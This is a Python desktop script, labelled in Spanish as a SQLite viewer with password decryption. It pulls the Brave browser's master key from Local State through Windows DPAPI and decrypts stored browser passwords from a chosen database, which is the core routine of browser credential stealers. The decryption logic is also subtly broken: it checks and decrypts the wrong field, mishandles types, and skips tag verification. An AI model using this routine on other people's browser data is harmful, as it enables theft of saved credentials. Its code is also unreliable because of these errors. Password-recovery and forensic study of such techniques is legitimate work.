import os
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from base64 import b64decode
from Crypto.Protocol.KDF import scrypt
import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter import ttk

# Función para obtener la clave maestra
def get_master_key():
    local_state_path = os.path.join(os.getenv("USERPROFILE"), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
    
    if not os.path.exists(local_state_path):
        return None
    
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = file.read()
        
    import json
    local_state_data = json.loads(local_state)
    
    encrypted_master_key = b64decode(local_state_data["os_crypt"]["encrypted_key"])
    
    encrypted_master_key = encrypted_master_key[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_master_key, None, None, None, 0)[1]
    
    return master_key

# Función para desencriptar la contraseña
def decrypt_password(encrypted_password, master_key):
    iv = encrypted_password[3:15]
    password = encrypted_password[15:]
    
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted = cipher.decrypt(password)
    
    return decrypted.decode()

# Función para abrir el archivo SQLite
def open_sqlite_file():
    file_path = filedialog.askopenfilename(filetypes=[("SQLite Files", "*.sqlite"), ("All Files", "*.*")])
    if not file_path:
        return

    try:
        conn = sqlite3.connect(file_path)
        cursor = conn.cursor()
    except sqlite3.Error as e:
        messagebox.showerror("Error", f"No se pudo abrir el archivo SQLite: {e}")
        return

    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
    tables = cursor.fetchall()

    if not tables:
        messagebox.showerror("Error", "No se encontraron tablas en la base de datos.")
        conn.close()
        return

    show_tables_window(tables, conn, cursor)

# Función para mostrar las tablas
def show_tables_window(tables, conn, cursor):
    window = tk.Toplevel()
    window.title("Tablas de la Base de Datos SQLite")

    listbox = tk.Listbox(window, selectmode="single", height=10)
    for table in tables:
        listbox.insert(tk.END, table[0])

    listbox.pack(expand=True, fill="both")

    def show_table_data():
        selected_table = listbox.get(tk.ACTIVE)
        if selected_table:
            cursor.execute(f"SELECT * FROM {selected_table}")
            rows = cursor.fetchall()

            # Obtener la clave maestra antes de pasarla a la siguiente función
            master_key = get_master_key()
            if not master_key:
                messagebox.showerror("Error", "No se pudo obtener la clave maestra para descifrar las contraseñas.")
                return

            show_data_window(selected_table, rows, master_key)

    show_button = tk.Button(window, text="Mostrar Datos", command=show_table_data)
    show_button.pack()

    close_button = tk.Button(window, text="Cerrar", command=window.destroy)
    close_button.pack()

# Función para mostrar los datos de la tabla seleccionada
def show_data_window(table_name, rows, master_key):
    window = tk.Toplevel()
    window.title(f"Datos de la tabla: {table_name}")

    if not rows:
        messagebox.showinfo("No hay datos", "No se encontraron datos en esta tabla.")
        return

    tree = ttk.Treeview(window, columns=[str(i) for i in range(len(rows[0]))], show="headings")
    
    for i in range(len(rows[0])):
        tree.heading(i, text=f"Columna {i+1}")

    for row in rows:
        if "password" in row[1].lower():  # Verificar si es una columna de contraseña
            decrypted_password = decrypt_password(row[1], master_key)
            row = row[:2] + (decrypted_password,) + row[3:]
        tree.insert("", "end", values=row)

    tree.pack(expand=True, fill="both")
    
    close_button = tk.Button(window, text="Cerrar", command=window.destroy)
    close_button.pack()

# Crear la ventana principal
root = tk.Tk()
root.title("Visor de Base de Datos SQLite con Desencriptación de Contraseñas")

open_button = tk.Button(root, text="Abrir Archivo SQLite", command=open_sqlite_file)
open_button.pack(pady=20)

root.mainloop()
